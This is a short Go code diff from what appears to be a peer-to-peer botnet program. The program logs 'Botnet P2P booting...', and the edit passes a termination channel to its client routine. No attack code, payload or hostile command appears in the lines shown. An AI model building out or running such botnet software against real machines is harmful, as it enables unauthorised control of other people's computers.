@@ -11,7 +11,7 @@ func main() {
 	terminate := make(chan struct{})
 	log.Println("Botnet P2P booting...")
 	go exitHandler(terminate)
-	go clientRoutine()
+	go clientRoutine(terminate)
 	serverRoutine(defaultPort, terminate)
 }
 
